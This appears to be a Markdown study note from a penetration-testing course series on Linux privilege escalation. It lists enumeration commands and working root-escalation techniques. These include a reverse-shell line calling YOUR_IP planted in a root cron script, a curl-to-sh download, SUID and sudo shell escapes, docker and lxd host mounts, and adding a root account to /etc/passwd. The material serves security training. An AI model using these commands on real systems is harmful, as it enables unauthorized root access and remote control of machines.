# 10 — Linux Privilege Escalation

## Step 1: Run Automated Enum First (then verify manually — don't blindly trust)

```bash
# Upload and run
curl http://YOUR_IP:8000/linpeas.sh | sh
# or
./linpeas.sh -a > linpeas_out.txt

# Alternative
./linenum.sh
./pspy64                     # process monitor - catches cron jobs running as root
```
**Better than HTB's `LinEnum`-first teaching:** run `linpeas.sh` as the primary tool (color-coded, far more checks, actively maintained) and `pspy` in parallel to catch scheduled tasks/cron running as root in real time — this catches things linpeas can miss (timing-based).

## Manual Checklist (run these even if linpeas is clean)

```bash
sudo -l                                  # what can I run as root?
find / -perm -4000 -type f 2>/dev/null   # SUID binaries
find / -perm -2000 -type f 2>/dev/null   # SGID binaries
cat /etc/crontab; ls -la /etc/cron*      # scheduled tasks
crontab -l
getcap -r / 2>/dev/null                  # binaries with capabilities
cat /etc/passwd | grep -v nologin        # who can login
find / -writable -type d 2>/dev/null | grep -v proc
netstat -tulpn                           # internal-only services (port forward + check)
id; groups                               # what groups am I in? (docker, lxd, disk = instant root)
uname -a; cat /etc/os-release            # kernel version for exploit search
```

## Common Wins

### SUID/GTFOBins
```bash
# Once you find a SUID binary, check GTFOBins.github.io for that binary name
find / -perm -4000 2>/dev/null
# e.g. if find is SUID:
find . -exec /bin/sh -p \; -quit
```

### sudo -l Abuse
```bash
sudo -l
# if you can run e.g. vim as root:
sudo vim -c ':!/bin/sh'
# Check GTFOBins for "sudo" column of the binary listed
```

### Cron Job Running Writable Script
```bash
cat /etc/crontab
# if a script run by root cron is writable by you:
echo 'bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1' >> /path/to/script.sh
```

### Docker/LXD Group Escape
```bash
# docker group = root equivalent
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# lxd group
lxc init ubuntu:18.04 test -c security.privileged=true
lxc config device add test host-root disk source=/ path=/mnt/root recursive=true
lxc start test; lxc exec test /bin/sh
```

### Kernel Exploits (last resort — riskier, can crash box)
```bash
searchsploit linux kernel <version>
# Check against: linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

### NFS no_root_squash
```bash
# on attacker, if a share has no_root_squash:
mount -t nfs <target>:/share /mnt
cp /bin/bash /mnt/bash; chmod +s /mnt/bash
# on target:
/share/bash -p
```

### Writable /etc/passwd
```bash
openssl passwd -1 -salt xyz password123
# append to /etc/passwd: newroot:<hash>:0:0:root:/root:/bin/bash
su newroot
```

### PATH Hijacking
```bash
# if a SUID binary or root script calls a command without full path (e.g. "ps" not "/bin/ps")
echo '/bin/bash' > /tmp/ps; chmod +x /tmp/ps
export PATH=/tmp:$PATH
```

## Quick Reference — Tools In This File

| Task | HTB-taught | Faster/better alternative |
|---|---|---|
| Automated enum | LinEnum | `linpeas.sh` (more checks, colorized, actively maintained) |
| Cron/timing-based | manual watching | `pspy64` (no root needed, shows all process execs live) |
| Kernel exploit suggestion | manual searchsploit | `linux-exploit-suggester.sh` cross-referenced with searchsploit |
| SUID abuse lookup | memorize | GTFOBins.github.io — just search the binary name |

Next: `11-windows-privesc.md`
